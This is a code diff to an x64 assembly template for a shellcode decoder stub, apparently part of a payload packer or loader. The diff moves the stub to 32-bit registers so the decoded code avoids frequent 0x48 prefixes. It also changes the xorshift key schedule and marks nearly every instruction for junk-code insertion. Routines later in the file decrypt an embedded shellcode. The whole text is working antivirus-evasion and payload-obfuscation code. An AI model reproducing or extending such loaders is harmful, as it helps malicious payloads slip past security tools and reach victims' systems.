@@ -75,12 +75,15 @@ body:
 var x64MiniDecoder = `
 .code64
 
-// rax store the random seed
-// rbx store the crypto key
-// rcx store the loop times
-// rdx store the xor shift median
+// NOT use R register for prevent appear
+// a lot of instruction prefix about 0x48
+
+// eax store the random seed
+// ebx store the crypto key
+// ecx store the loop times
+// edx store the xor shift median
 // rsi store the body address
-// rdi store the current value
+// edi store the current value
 
 header:
   push rax                                     {{igi}}
@@ -91,13 +94,13 @@ header:
   push rdi                                     {{igi}}
   pushfq                                       {{igi}}
 
-  mov rax, {{hex .Seed}}
-  mov rbx, {{hex .Key}}
+  mov eax, {{hex .Seed}}
+  mov ebx, {{hex .Key}}
 
   // prevent continuous 0x00
-  mov rcx, {{hex .NumLoopStub}}
-  xor rcx, {{hex .NumLoopMaskA}}
-  xor rcx, {{hex .NumLoopMaskB}}
+  mov ecx, {{hex .NumLoopStub}}
+  xor ecx, {{hex .NumLoopMaskA}}
+  xor ecx, {{hex .NumLoopMaskB}}
 
   // calculate the body address
   lea rsi, [rip + body + {{hex .OffsetT}}]     {{igi}}
@@ -106,30 +109,30 @@ header:
 
  loop_xor:
   // xor block data
-  mov rdi, [rsi]                               {{igi}}
-  ror rdi, 17                                  {{igi}}
-  xor rdi, rax                                 {{igi}}
-  rol rdi, 7                                   {{igi}}
-  xor rdi, rbx                                 {{igi}}
-  mov [rsi], rdi                               {{igi}}
+  mov edi, [rsi]                               {{igi}}
+  ror edi, 17                                  {{igi}}
+  xor edi, eax                                 {{igi}}
+  rol edi, 7                                   {{igi}}
+  xor edi, ebx                                 {{igi}}
+  mov [rsi], edi                               {{igi}}
 
-  // xor shift 64
+  // xor shift 32
   // seed ^= seed << 13
-  // seed ^= seed >> 7
-  // seed ^= seed << 17
-  mov rdx, rax                                 {{igi}}
-  shl rdx, 13                                  {{igi}}
-  xor rax, rdx                                 {{igi}}
-  mov rdx, rax                                 {{igi}}
-  shr rdx, 7                                   {{igi}}
-  xor rax, rdx                                 {{igi}}
-  mov rdx, rax                                 {{igi}}
-  shl rdx, 17                                  {{igi}}
-  xor rax, rdx                                 {{igi}}
+  // seed ^= seed >> 17
+  // seed ^= seed << 5
+  mov edx, eax                                 {{igi}}
+  shl edx, 13                                  {{igi}}
+  xor eax, edx                                 {{igi}}
+  mov edx, eax                                 {{igi}}
+  shr edx, 17                                  {{igi}}
+  xor eax, edx                                 {{igi}}
+  mov edx, eax                                 {{igi}}
+  shl edx, 5                                   {{igi}}
+  xor eax, edx                                 {{igi}}
 
   // update address and counter
-  add rsi, 8                                   {{igi}}
-  dec rcx                                      {{igi}}
+  add rsi, 4                                   {{igi}}
+  dec ecx                                      {{igi}}
   jnz loop_xor                                 {{igi}}
 
   popfq                                        {{igi}}
@@ -245,7 +248,7 @@ decode_stubs:
   mov rdx, shellcode_stub - crypto_key_stub  {{igi}}
   mov r8, {{hex .CryptoKeyStubKey}}          {{igi}}
   call mini_xor                              {{igi}}
-  ret
+  ret                                        {{igi}}
 
 decode_shellcode:
   lea rcx, [rbx + shellcode_stub]  {{igi}}
